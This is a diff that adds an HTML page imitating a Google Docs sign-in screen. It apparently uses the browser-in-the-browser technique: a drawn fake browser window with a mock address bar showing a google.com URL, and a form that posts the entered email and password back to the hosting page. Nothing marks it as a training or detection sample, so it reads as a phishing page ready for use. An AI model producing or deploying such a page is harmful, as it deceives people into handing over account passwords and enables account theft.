@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<body id="body">
+    <div id="window">
+        <div class="box" id="login-container">
+            <div class="row-dark">
+                <img src="google.png"><p>Log Into Your Google Account</p>
+            </div>
+            <div class="row-light">
+                <img src="lock.png"><p class="url">&nbsp;<span style="color: grey">https://docs.</span>google.com/account/login</p>
+            </div>
+            <div class="signin">
+				<img src="logo.png" width="100px">
+                <h2>Sign in</h2>
+                <p>to continue to Docs</p>
+                <form action="" method="post" name="form">
+                  <div class="inputBox">
+                    <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
+                    <label>Email or phone</label>
+                  </div>
+                  <div class="inputBox">
+                        <input type="password" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+                        <label>Password</label>
+                      </div>
+                  <input type="submit" name="sign-in" value="Next">
+                </form>
+              </div>
+            </div>
+    </div>
+</body>
+<script>
+    $(document).ready(function(){
+        setTimeout(function(){
+          if($(window).width() >= 2300){
+            $('#body').delay(800).css('background-image', 'url(bck-lg-blur.png)');
+            $("#login-container").fadeIn(300);
+          }else{
+            $('#body').delay(800).css('background-image', 'url(bck-blur.png)');
+            $("#login-container").fadeIn(300);
+          }
+        }, 500); 
+      });
+
+    </script>
+</html>
